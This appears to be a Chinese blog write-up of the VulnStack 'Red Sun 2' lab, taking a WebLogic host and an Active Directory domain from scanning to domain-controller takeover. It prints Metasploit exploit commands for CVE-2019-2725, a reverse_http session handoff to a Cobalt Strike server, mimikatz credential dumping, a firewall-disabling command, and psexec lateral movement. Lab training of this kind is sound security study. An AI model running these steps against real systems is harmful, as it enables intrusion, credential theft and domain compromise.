---
title: VulnStack-红日2
author: Creexile
date: 2024-05-03
lastMod: 2025-04-10
summary: ''
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [Kali, 内网, CS, MSF, 渗透]
---

# vulnstack红队2

**拍快照,拍快照,拍快照!**

新增两个虚拟网络:
192.168.111.0/24 外网环境(Vmnet1)
10.10.10.0/24 内网环境(Vmnet2)

> 靶机初始密码均为`1qaz@WSX`
>
> 管理员账号密码为`Administrator/1qaz@WSX`
>
> 当win7可以ping通所有ip地址, 环境就配置完成了

- kali

  192.168.111.128

- PC.de1ay.com

  用`DE1AY\mssql/1qaz@WSX`登录

  192.168.111.201

  10.10.10.201

- DC.de1ay.com

  用`DE1AY\de1ay/1qaz@WSX`登录

  10.10.10.10

- WEB.de1ay.com

  这里因为域不同所以需要切换用户用`de1ay/1qaz@WSX`登录
  192.168.111.80
  10.10.10.80

右键以管理员身份运行`C:\Oracle\Middleware\user_projects\domains\base_domain`下的bat文件, 然后访问`ip:7001/console`让其自动部署即可启动好环境,刷新一下就能到后台登录界面,问就是没有其他网页

这个360让我先试试水,在PC.de1ay.com上也有360,都打开

> 好像开了360就不能被ping通了,现在pc和web相互无法ping通

![image-20240503082902329](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503082902329.png)

## 外网渗透

### 信息收集

```
nmap -sn 192.168.111.0/24	// 主机发现
nmap -sS 192.168.111.80		// 半开放扫描扫描目标端口
nmap -sS -Pn 192.168.111.80		// 也可以用绕过防火墙的参数
```

可以看到两台主机: 201和80, 201扫描之后没有什么东西(都开了远程桌面和445端口?)

![image-20240503102344954](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503102344954.png)

7001: weblogic有着对应的扫描器, [下载地址](https://github.com/rabbitmask/WeblogicScan)

```
python3 WeblogicScan.py -u 192.168.111.80 -p 7001
```

有两个漏洞,我们用最新的看能不能不触发360的防护

![image-20240503110448745](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503110448745.png)

### 漏洞利用

启动msf

```
search cve-2019-2725
use 0
set payload windows/x64/meterpreter/bind_tcp
set target 1
set lport 10000
set rhosts 192.168.111.80
run
```

![image-20240503151954640](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503151954640.png)

由于360的存在,提权不太可能如此顺利,先进入shell进行信息收集

## 内网渗透

### 信息收集

```
whoami          // de1ay\administrator
ipconfig /all	// 域de1ay.com, 内网地址10.10.10.80, 外网地址192.168.111.80
net user /domain	// 无回显
net user		// Administrator, de1ay, Guest
net config workstation 		// 计算机详细信息
```

![image-20240503155126019](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503155126019.png)

利用ping寻找域控, `10.10.10.10`

![image-20240503163035435](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503163035435.png)

### msf和cs联动

**msf->cs**

```
./teamserver 192.168.111.128 123456		// 启动js
```

设置监听器如下, HTTP地址和端口随意设置, 要求和前面不能占用同一个端口

![image-20240503153330777](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503153330777.png)

在msf中执行如下, 成功的话就可以看见一个新的会话

```
background
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set DisablePayloadHandler true
set lhost 192.168.111.128
set lport 1234
set session 1	// 此处session是漏洞利用后连上win7的会话
run
```

会话交互,先输入`sleep 1`后立刻输入`shell whoami`等待回显, 有回显证明会话有效

可以直接提权:

![image-20240503162727794](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503162727794.png)

利用`mimikatz`抓密码,然后就可以在**密码凭据**界面看到抓到的密码

```
logonpasswords	// 抓明文
hashdump	// 抓hash
```

![image-20240503163658011](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503163658011.png)

尝试关闭防火墙, 成功, 但是似乎执行`net view`还是不可用

```
shell netsh advfirewall set allprofiles state off
```

### 横向移动

和红队1相同,先创建smb监听器, 我直接就叫smb

我的是中文版,是右键会话选择`新建会话(S)`就可以绑定smb监听器,还是交互输入`spawn smb`好

我现在右键的这个是执行命令后多出来的"跳板"

> SMB Beacon使用windows管道进行通信,可以把以此为枢纽,进行内外网的流量转发

![image-20240503164211635](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503164211635.png)

我这里攻击列表并没有出现域控或是其他主机, 我只能根据之前的信息进行手动添加

`视图(V)-->目标列表(T)-->下方的添加`, ip就直接是域控就好了`10.10.10.10`

先进行端口扫描,发现开放的端口中有135,139,445,尝试`psexec`登录域控, smb是之前新建的监听器

![image-20240503173030495](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173030495.png)

登录成功,我们取得了DC的控制权,而且权限为system

![image-20240503173308230](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173308230.png)

对于另一个域成员只需要故技重施即可,虽然只知道外网地址,但是可以通过输入`arp -a`来看还有哪些主机,我这里在域控上输入:

![image-20240503173628952](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173628952.png)

轻易得到另一台主机是`10.10.10.201`,其他不再赘述

> 此外可以做的拓展: ms14-068的域内提权
>
> 诶话说回来, 360似乎没有啥截拦啊
